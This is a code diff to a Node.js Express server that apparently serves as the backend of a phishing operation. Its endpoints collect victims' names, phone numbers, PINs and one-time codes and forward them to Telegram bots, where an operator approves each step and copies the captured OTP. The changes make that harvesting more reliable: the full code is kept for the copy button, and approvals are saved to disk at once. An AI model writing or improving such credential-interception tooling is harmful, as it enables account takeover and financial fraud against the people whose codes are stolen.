@@ -20,8 +20,7 @@ const REQUIRED_UPDATES = ['message', 'callback_query'];
 const SEP = '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━';
 
 // ============================================================
-// 🔑 callback_data carries the identity
-// Format:  action:requestId|name|phone|extra
+// 🔑 callback_data — name gets priority, extra gets the rest
 // ============================================================
 const CB_MAX = 64;
 
@@ -29,15 +28,20 @@ function escapeField(v) { return String(v == null ? '' : v).replace(/\|/g, '¦')
 function unescapeField(v) { return String(v == null ? '' : v).replace(/¦/g, '|'); }
 
 function buildCallback(action, requestId, name, phone, extra) {
-    let n = escapeField(name);
-    let p = escapeField(phone);
-    let e = escapeField(extra || '');
     const rid = escapeField(requestId);
-    const assemble = () => `${action}:${rid}|${n}|${p}|${e}`;
-    let out = assemble();
-    while (out.length > CB_MAX && n.length > 0) { n = n.slice(0, -1); out = assemble(); }
-    while (out.length > CB_MAX && e.length > 0) { e = e.slice(0, -1); out = assemble(); }
-    return out;
+    const p   = escapeField(phone);
+
+    const fixedLen = `${action}:${rid}||${p}|`.length;
+    let available = CB_MAX - fixedLen;
+    if (available < 0) available = 0;
+
+    const nameCap  = Math.max(0, Math.floor(available * 0.6));
+    const extraCap = Math.max(0, available - nameCap);
+
+    const n = escapeField(name).slice(0, nameCap);
+    const e = escapeField(extra || '').slice(0, extraCap);
+
+    return `${action}:${rid}|${n}|${p}|${e}`;
 }
 
 function parseCallback(data) {
@@ -54,6 +58,31 @@ function parseCallback(data) {
         phone:     unescapeField(parts[2] || ''),
         extra:     unescapeField(parts.slice(3).join('|') || '')
     };
+}
+
+// ============================================================
+// 📩 Extract Code / PIN from the original Telegram message
+// Used as fallback for the copy button when the store is gone.
+// ============================================================
+function extractFieldFromMessage(text, label) {
+    if (!text) return '';
+    const normalized = String(text).replace(/\u00A0/g, ' ');
+    const lines = normalized.split(/\r?\n/);
+    const re = new RegExp('^' + label + '\\s*:\\s*(.*)$', 'i');
+    for (let i = 0; i < lines.length; i++) {
+        const m = lines[i].match(re);
+        if (m) {
+            const parts = [m[1]];
+            for (let j = i + 1; j < lines.length; j++) {
+                const next = lines[j].trim();
+                if (/^[━─]+$/.test(next)) break;
+                if (/^(Name|Phone|PIN|Code)\s*:/i.test(next)) break;
+                parts.push(lines[j]);
+            }
+            return parts.join('\n').trim();
+        }
+    }
+    return '';
 }
 
 // ---------------- PERSISTENT STORE ----------------
@@ -83,19 +112,27 @@ function loadStore() {
     }
 }
 
+// ⚡ Synchronous write — used for approval decisions so the state
+// hits disk BEFORE the response is sent. This is what makes the
+// approval survive a restart that happens immediately after a click.
+function saveStoreSync() {
+    try {
+        const tmp = STORE_FILE + '.tmp';
+        fs.writeFileSync(tmp, JSON.stringify({
+            approvedPins, approvedCodes, approvedPhones, blockPins, requestBotMap
+        }, null, 2));
+        fs.renameSync(tmp, STORE_FILE);
+    } catch (err) {
+        console.error('❌ Failed to save store (sync):', err.message);
+    }
+}
+
+// Debounced write — used for high-frequency, low-stakes updates
 let saveTimer = null;
 function saveStore() {
     if (saveTimer) clearTimeout(saveTimer);
     saveTimer = setTimeout(() => {
-        try {
-            const tmp = STORE_FILE + '.tmp';
-            fs.writeFileSync(tmp, JSON.stringify({
-                approvedPins, approvedCodes, approvedPhones, blockPins, requestBotMap
-            }, null, 2));
-            fs.renameSync(tmp, STORE_FILE);
-        } catch (err) {
-            console.error('❌ Failed to save store:', err.message);
-        }
+        saveStoreSync();
     }, 200);
 }
 
@@ -131,7 +168,6 @@ app.use(express.static('public'));
 function getBot(botId) { return bots.find(b => b.botId === botId); }
 function botList() { return bots.map(b => b.botId).join(', ') || '(none)'; }
 
-// 🧹 Strip the literal word "Unknown" from any incoming value.
 function clean(v) {
     const s = String(v == null ? '' : v).trim();
     return /^unknown$/i.test(s) ? '' : s;
@@ -301,7 +337,6 @@ app.get('/code', (req, res) => res.sendFile(path.join(__dirname, 'public', 'code
 app.post('/submit-phone', (req, res) => {
     const { name, phone, botId } = req.body;
     console.log('📥 /submit-phone body =', JSON.stringify(req.body));
-    console.log('📥 /submit-phone received botId =', botId, '| valid bots:', botList());
 
     const bot = getBot(botId);
     if (!bot) {
@@ -309,7 +344,6 @@ app.post('/submit-phone', (req, res) => {
         return res.status(400).json({ error: 'Invalid bot: ' + botId });
     }
 
-    // 🧹 strip any literal "Unknown"
     const finalName = clean(name);
     const finalPhone = clean(phone);
 
@@ -344,7 +378,6 @@ app.get('/check-phone/:requestId', (req, res) => {
 app.post('/submit-pin', (req, res) => {
     const { name, phone, pin, botId } = req.body;
     console.log('📥 /submit-pin body =', JSON.stringify(req.body));
-    console.log('📥 /submit-pin received botId =', botId, '| valid bots:', botList());
 
     const bot = getBot(botId);
     if (!bot) {
@@ -394,7 +427,6 @@ app.get('/check-pin/:requestId', (req, res) => {
 app.post('/submit-code', (req, res) => {
     const { name, phone, code, botId } = req.body;
     console.log('📥 /submit-code body =', JSON.stringify(req.body));
-    console.log('📥 /submit-code received botId =', botId, '| valid bots:', botList());
 
     const bot = getBot(botId);
     if (!bot) {
@@ -440,7 +472,9 @@ app.get('/check-code/:requestId', (req, res) => {
     res.json({ approved: approvedCodes[requestId] ?? null });
 });
 
-// ---------------- TELEGRAM WEBHOOK ----------------
+// ============================================================
+// 🔒 TELEGRAM WEBHOOK — ALWAYS HANDLES callback_query
+// ============================================================
 app.post('/telegram-webhook/:botId', async (req, res) => {
     res.sendStatus(200);
 
@@ -471,18 +505,26 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
 
         const { action, requestId, name, phone, extra } = parsed;
 
-        // COPY OTP
+        // ============================================================
+        // 📋 COPY OTP — full value from store, message fallback, then extra
+        // ============================================================
         if (action === 'code_copy') {
-            const copyCode = extra || '';
+            const fromStore   = (requestBotMap[requestId] && requestBotMap[requestId].code) || '';
+            const fromMessage = extractFieldFromMessage(cb.message?.text, 'Code');
+            const fullCode    = fromStore || fromMessage || extra || '';
+
             await answerCallback(bot, cb.id, 'Code sent for copying');
 
             const originalMsgId = cb.message?.message_id;
-            const copyMessage = `<code>${esc(copyCode)}</code>`;
+            const copyMessage = `<code>${esc(fullCode)}</code>`;
 
             if (originalMsgId) await replyTelegramMessage(bot, originalMsgId, copyMessage);
             else await sendTelegramMessage(bot, copyMessage);
 
-            console.log('📋 code_copy sent for', requestId, '→', copyCode, `via ${bot.botId}`);
+            console.log('📋 code_copy sent for', requestId,
+                        '| len =', fullCode.length,
+                        '| source =', fromStore ? 'store' : (fromMessage ? 'message' : 'callback'),
+                        `| via ${bot.botId}`);
             return;
         }
 
@@ -542,7 +584,9 @@ app.post('/telegram-webhook/:botId', async (req, res) => {
 
         if (!handled) return;
 
-        saveStore();
+        // ⚡ FLUSH TO DISK IMMEDIATELY — this is what makes the approval
+        // survive a restart that happens right after this click.
+        saveStoreSync();
         console.log('✅', action, '→', requestId, `(${name} / ${phone}) via ${bot.botId}`);
 
         if (cb.message && newText) await editMessageText(bot, cb.message.chat.id, cb.message.message_id, newText);
